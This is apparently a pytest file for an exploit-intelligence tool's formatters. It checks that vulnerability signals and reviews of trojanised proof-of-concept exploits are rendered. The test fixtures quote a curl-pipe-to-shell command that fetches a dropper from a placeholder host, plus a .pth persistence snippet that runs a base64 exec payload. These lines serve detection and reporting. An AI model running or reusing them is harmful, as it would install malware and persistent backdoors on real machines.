from __future__ import annotations

from eip_mcp import formatters, validators


def test_validate_source_accepts_patchapalooza() -> None:
    """The eip-server ingests exploits with source='patchapalooza' (~300 rows
    in production). The MCP allowlist must keep parity so users can filter."""
    assert validators.validate_source("patchapalooza") == "patchapalooza"


def test_format_search_results_surfaces_new_exploitation_signals() -> None:
    text = formatters.format_search_results(
        {
            "total": 1,
            "page": 1,
            "total_pages": 1,
            "items": [
                {
                    "cve_id": "CVE-2026-1111",
                    "severity_label": "critical",
                    "cvss_v3_score": 9.8,
                    "epss_score": 0.91,
                    "exploit_count": 3,
                    "is_kev": False,
                    "is_vulncheck_kev": False,
                    "is_exploited_wild": True,
                    "ransomware_use": "Known",
                    "has_nuclei_template": True,
                    "is_test": True,
                    "title": "Signal-rich vulnerability",
                }
            ],
        }
    )

    assert "[WILD]" in text
    assert "[RANSOMWARE]" in text
    assert "[NUCLEI]" in text
    assert "[TEST]" in text


def test_format_exploit_analysis_surfaces_backdoor_review() -> None:
    text = formatters.format_exploit_analysis(
        {
            "id": 61514,
            "source": "nomisec",
            "source_id": "evil-poc",
            "source_url": "https://example.com/evil-poc",
            "cve_id": "CVE-2026-2222",
            "cve_title": "Example RCE",
            "severity_label": "critical",
            "cvss_v3_score": 9.8,
            "llm_classification": "working_poc",
            "llm_analysis": {
                "attack_type": "RCE",
                "complexity": "simple",
                "reliability": "reliable",
                "confidence": 0.92,
            },
            "llm_backdoor_verdict": "trojan",
            "llm_backdoor_reviewed_at": "2026-03-20T11:00:00+00:00",
            "llm_backdoor_review": {
                "classification": "trojan",
                "confidence": 0.97,
                "operator_risk": "high",
                "summary": "Downloads a second-stage payload before pretending to exploit the target.",
                "deception_indicators": [
                    "Fetches an external binary unrelated to the advertised CVE.",
                ],
                "iocs": ["https://cdn.example.invalid/dropper.bin"],
                "evidence_snippets": ["curl -fsSL https://cdn.example.invalid/dropper.bin | sh"],
            },
        }
    )

    assert "BACKDOOR REVIEW: TROJAN" in text
    assert "Operator Risk: high" in text
    assert "Reviewed:" in text
    assert "Deception Indicators:" in text
    assert "IOCs:" in text
    assert "Evidence:" in text


def test_format_exploit_analysis_handles_dict_shaped_iocs_and_evidence() -> None:
    """Real backdoor reviews can return iocs as a category->items dict and
    evidence_snippets as a list of finding/evidence/why_it_matters dicts.
    The formatter must render both without raising."""
    text = formatters.format_exploit_analysis(
        {
            "id": 61514,
            "source": "nomisec",
            "source_id": "evil-poc",
            "cve_id": "CVE-2026-3333",
            "severity_label": "critical",
            "cvss_v3_score": 10.0,
            "llm_classification": "trojan",
            "llm_backdoor_verdict": "trojan",
            "llm_backdoor_review": {
                "classification": "trojan",
                "confidence": 0.96,
                "operator_risk": "critical",
                "summary": "Drops a .pth persistence payload.",
                "deception_indicators": ["Base64-obfuscated exec payload"],
                "iocs": {
                    "ips": [],
                    "urls": [],
                    "commands": ["img\\[([a-zA-Z0-9+/=]+)\\]"],
                    "file_paths": [
                        "/usr/lib/python3.6/site-packages/system.pth",
                        "/var/log/pan/sslvpn_ngx_error.log",
                    ],
                },
                "evidence_snippets": [
                    {
                        "finding": ".pth persistence with obfuscated exec",
                        "evidence": "f.write(b'''import base64;exec(base64.b64decode(...))''')",
                        "why_it_matters": "Auto-executes a hidden payload on interpreter start.",
                    }
                ],
            },
        }
    )

    assert "IOCs:" in text
    assert "commands: img" in text
    assert "file_paths: /usr/lib/python3.6/site-packages/system.pth" in text
    assert "Evidence:" in text
    assert ".pth persistence with obfuscated exec" in text
